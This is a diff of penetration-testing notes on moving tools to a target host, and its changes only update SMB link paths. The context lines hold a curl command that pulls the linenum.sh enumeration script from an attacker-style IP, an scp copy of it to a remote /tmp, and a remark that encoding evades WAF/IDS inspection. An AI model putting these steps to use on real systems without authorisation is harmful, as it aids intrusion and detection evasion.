@@ -23,7 +23,7 @@ $ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
 $ scp linenum.sh user@remotehost:/tmp/linenum.sh
 ```
 
-More transfer channels (SMB share, netcat, in-memory execution) are in [smb](Tools/smb.md), [netcat](Shell/netcat.md), and the [Privilege Escalation](Privilege%20Escalation/README.md) tool notes.
+More transfer channels (SMB share, netcat, in-memory execution) are in [smb](Protocols/smb.md), [netcat](Shell/netcat.md), and the [Privilege Escalation](Privilege%20Escalation/README.md) tool notes.
 
 ## When the firewall blocks it — encode & paste
 
@@ -69,4 +69,4 @@ Encoding also dodges **content inspection**: a WAF/IDS that flags a plaintext sc
 
 ## Related
 
-[folder README](README.md) · [netcat](Shell/netcat.md) · [smb](Tools/smb.md) · [Pivoting & Tunneling](Networking/Pivoting%20%26%20Tunneling.md) · [Privilege Escalation](Privilege%20Escalation/README.md)
+[folder README](README.md) · [netcat](Shell/netcat.md) · [smb](Protocols/smb.md) · [Pivoting & Tunneling](Networking/Pivoting%20%26%20Tunneling.md) · [Privilege Escalation](Privilege%20Escalation/README.md)
